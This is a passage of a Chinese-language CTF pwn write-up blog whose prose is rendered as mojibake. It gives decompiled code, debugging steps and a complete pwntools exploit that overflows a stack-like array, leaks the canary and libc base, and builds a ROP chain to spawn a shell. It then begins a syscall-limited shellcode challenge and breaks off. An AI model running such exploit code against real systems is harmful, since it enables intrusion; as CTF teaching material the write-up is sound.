class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¤§æ¦‚æ“ä½œæ¯”è¾ƒç®€å•ï¼Œç»™äº†ä¸€ä¸ªèœå•ï¼Œæˆ‘ä»¬å¯ä»¥push,pop,edit,showå’ŒexitåŠŸèƒ½ï¼Œæˆ‘ä»¬çœ‹çœ‹pushæ˜¯å¦‚ä½•å®ç°çš„ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18F4</span><span class="params">(__int64 a1, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *a2;</span><br><span class="line">  result = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">24</span>) = result + <span class="number">1</span>;            <span class="comment">// å¯æº¢å‡ºè¦†ç›–</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span> * result) = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>é€šè¿‡å°†æ•°æ®æ”¾è¿›a1æ‰€æŒ‡å‘åœ°å€çš„ä¸€ä¸ªåç§»å¤„ï¼Œå¹¶ä¸”åœ¨ +24çš„ä½ç½®è®¾ç½®äº†ä¸€ä¸ªæ•°æ®çš„ä¸ªæ•°ï¼Œé‚£ä¹ˆæ­¤å¤„æ˜¯å­˜åœ¨è¦†ç›–çš„ï¼Œå› ä¸ºa1ä¹Ÿå°±æ˜¯ä¸»å‡½æ•°é‡Œé¢çš„v8è¿™ä¸ªå­—èŠ‚æ•°ç»„ï¼Œæ˜¯å­˜åœ¨ä¸æ ˆä¸Šçš„ï¼Œç”±äºâ€æ ˆâ€ç©ºé—´æ˜¯å‚¨å­˜åœ¨ +24è¿™ä¸ªå›ºå®šåç§»çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å¾€æ ˆä¸Šå¤šå†™å‡ ä¸ªæ•°æ®å°±å¯ä»¥è¦†ç›–â€æ ˆç©ºé—´â€äº†ï¼Œä¸‹é¢å…·ä½“çœ‹ä¸€ä¸‹ï¼š</p><h2 id="æ¼æ´ç‚¹è°ƒè¯•"><a href="#æ¼æ´ç‚¹è°ƒè¯•" class="headerlink" title="æ¼æ´ç‚¹è°ƒè¯•"></a>æ¼æ´ç‚¹è°ƒè¯•</h2><ul><li>å…ˆpushå››ä¸ªæ•°å­—ï¼š1ï¼Œ2ï¼Œ3ï¼Œ4çœ‹çœ‹æ ˆä¸Šçš„æ•°æ®ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250120224301608.png" alt="image-20250120224301608"></p><ul><li>å¯ä»¥æ˜æ˜¾å‘ç°ï¼Œæˆ‘ä»¬pushç¬¬ä¸ƒä¸ªæ•°æ®å°±ä¼šè¦†ç›–â€æ ˆç©ºé—´â€ï¼Œç”±äºæ­¤é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²canaryå’Œlibcï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡³å°‘è¦æ³„éœ²rbp+8é‚£é‡ŒæŒ‡å‘çš„ä¸€ä¸ªå¯ä»¥ç®—å‡ºlibc_baseçš„åœ°å€(æœ¬æœºlibcç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥æ ˆä¸Šæ•°æ®ä¸ä¸€è‡´ï¼Œå®é™…ä¸Šlibc.soé‡Œé¢ä¹Ÿæ²¡æœ‰__libc_start_call_main),å› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾è¦†ç›–â€œæ ˆç©ºé—´ä¸º20.</li><li>æ¥ç€å¦‚ä½•æ³„éœ²canaryå’Œlibc? å…¶å®ç›´æ¥showå°±å¥½äº†ï¼Œæˆ‘ä»¬æ‰“è¿œç¨‹çœ‹çœ‹è¦†ç›–â€æ ˆç©ºé—´â€ä¹‹åï¼Œshowå‡ºæ¥20ä¸ª4å­—èŠ‚çš„æ•°æ®æ˜¯ä»€ä¹ˆ(å› ä¸ºæ¯ä¸ªæ•°æ®å‡æ˜¯ä»¥unsigned intå‚¨å­˜ï¼Œè¾“å‡ºä¹Ÿæ˜¯ï¼Œæ•…ä¸º4å­—èŠ‚)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># é€ æˆæº¢å‡º</span></span><br><span class="line"></span><br><span class="line">show() </span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../image-20250120225111355.png" alt="image-20250120225111355"></p><p>å¯¹ç…§ç€ä¹‹å‰åŠ¨è°ƒçš„æ ˆç©ºé—´ï¼Œå¯ä»¥å¾—åˆ° <code>20 0 0 0 </code>ä¹‹åçš„æ•°æ®ä¾¿æ˜¯canaryï¼Œä¸¤éƒ¨åˆ†éƒ½æ˜¯canaryï¼Œä¸€ä¸ªæ˜¯é«˜ä½ï¼Œä¸€ä¸ªæ˜¯åœ°ä½ï¼Œä½†æ˜¯æ³¨æ„åˆ°æ•°æ®æœ‰è´Ÿæ•°ï¼Œè¦å°†å…¶è½¬åŒ–ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œå³ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„æ¼canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># å¤„ç†å‡ºç°è´Ÿæ•°å³æ— ç¬¦å·æº¢å‡ºçš„æƒ…å†µ</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br></pre></td></tr></table></figure></div><p>åŒç†ï¼Œ<code>0 0 0 0 2 0 </code>ä¹‹åçš„æ•°æ®ä¾¿æ˜¯å¯ä»¥æ³„éœ²libcäº†ï¼Œæ–¹æ³•å’Œcanaryæ˜¯ä¸€è‡´çš„ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span> <span class="comment"># è¿™ä¸ªæ•°æ®ä¼°è®¡è¦patchelfä¹‹ååŠ¨è°ƒæ‰çŸ¥é“ï¼Œä½†æ˜¯c++çš„æ–‡ä»¶æˆ‘è¿˜ä¸ä¼špatchelfï¼Œåç»­å†è¡¥ä¸Š</span></span><br></pre></td></tr></table></figure></div><ul><li>æ¥ä¸‹æ¥å°±æ˜¯å¸ƒç½®ropé“¾å°±è¡Œäº†ï¼Œä½†æ˜¯æ³¨æ„ï¼Œæˆ‘ä»¬è¦åœ¨ret_addråœ°æ–¹å¸ƒç½®ï¼Œç”±äºæ­¤æ—¶â€œæ ˆç©ºé—´â€æ˜¯20ï¼Œç›´æ¥pushçš„è¯ä¸æ˜¯åœ¨ret_addrï¼Œæ‰€ä»¥è¿˜éœ€è¦å…ˆpopä¸¤ä¸ªæ•°æ®å‡ºæ¥ï¼Œå†å¸ƒç½®ropé“¾å³å¯ï¼Œæ³¨æ„æ¯æ¬¡pushä»…ä¸º4å­—èŠ‚ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾äº†ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªéœ€ä¿®æ”¹ret_addrå³å¯ï¼Œå°†â€œstack&quot;é€€åˆ°ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ ropé“¾,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit() <span class="comment">#å¸ƒç½®å®Œropé“¾éœ€åœæ­¢ç¨‹åºï¼Œè®©ç¨‹åºå»æ‰§è¡Œropé“¾</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">p = remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,....)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index to edit (0-based): &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Enter the new value: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the value to push: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># é€ æˆæº¢å‡º</span></span><br><span class="line"></span><br><span class="line">show() </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„æ¼canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># å¤„ç†å‡ºç°è´Ÿæ•°å³æ— ç¬¦å·æº¢å‡ºçš„æƒ…å†µ</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;canary_high: &quot;</span>,canary_high)</span><br><span class="line">lg(<span class="string">&quot;canary_low: &quot;</span>,canary_low)</span><br><span class="line">lg(<span class="string">&quot;canary: &quot;</span>,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„æ¼libc</span></span><br><span class="line">ru(<span class="string">&#x27;0 0 0 0 2 0 &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åªéœ€ä¿®æ”¹ret_addrå³å¯ï¼Œå°†â€œstack&quot;é€€åˆ°ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ ropé“¾,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Heavenâ€™s-door"><a href="#Heavenâ€™s-door" class="headerlink" title="Heavenâ€™s door"></a>Heavenâ€™s door</h1><p>åªå…è®¸ä¸¤æ¬¡syscalä¸”å¼€å¯sendboxçš„shellcodeé¢˜ç›®ã€‚</p><ul><li>å…ˆæŸ¥çœ‹ä¸€ä¸‹ä¸»å‡½æ•°</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">__pid_t</span> v8; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v8 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;puchid: %d\n&quot;</span>, v8);</span><br><span class="line">    mmap((<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x10000</span>, <span class="number">0xC3</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)count_syscall_instructions(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>) &gt; <span class="number">2</span> ) <span class="comment">// æ ¸å¿ƒ</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    sandbox(<span class="number">0x10000</span>LL, <span class="number">4096LL</span>, v4, v5, v6, v7);</span><br><span class="line">    MEMORY[<span class="number">0x10000</span>]();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    made_in_heaven(); <span class="comment">// è¾“å‡ºä¸€äº›äººåä»¥åŠä½œè€…ï¼Œç”¨å¤„ä¸å¤§</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The time is Accelerating&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;MADE IN HEAVEN !!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>æŸ¥çœ‹ä¸€ä¸‹æ ¸å¿ƒçš„å‡½æ•° <code>count_syscall_instructions</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">count_syscall_instructions</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; a2 - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + i) == <span class="number">15</span> &amp;&amp; *(_BYTE 